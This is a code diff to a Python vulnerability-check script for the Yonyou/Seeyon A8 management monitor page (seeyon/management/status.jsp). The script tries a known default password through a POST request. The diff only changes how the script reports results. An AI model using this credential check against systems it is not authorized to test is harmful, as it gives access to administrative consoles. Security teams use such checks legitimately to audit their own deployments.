@@ -9,8 +9,8 @@ description: 路径seeyon/management/status.jsp存在默认密码WLCCYBD@SEEYON�
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yonyou_status_default_pwd_BaseVerify:
     def __init__(self, url):
@@ -28,12 +28,12 @@ class yonyou_status_default_pwd_BaseVerify:
                 vulnurl = self.url + payload
                 req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
                 if r"A8 Management Monitor" in req.text and r"Connections Stack Trace" in req.text:
-                    cprint("[+]存在用友a8监控后台默认密码漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                    return "[+]存在用友a8监控后台默认密码漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yonyou_status_default_pwd_BaseVerify(sys.argv[1])
     testVuln.run()
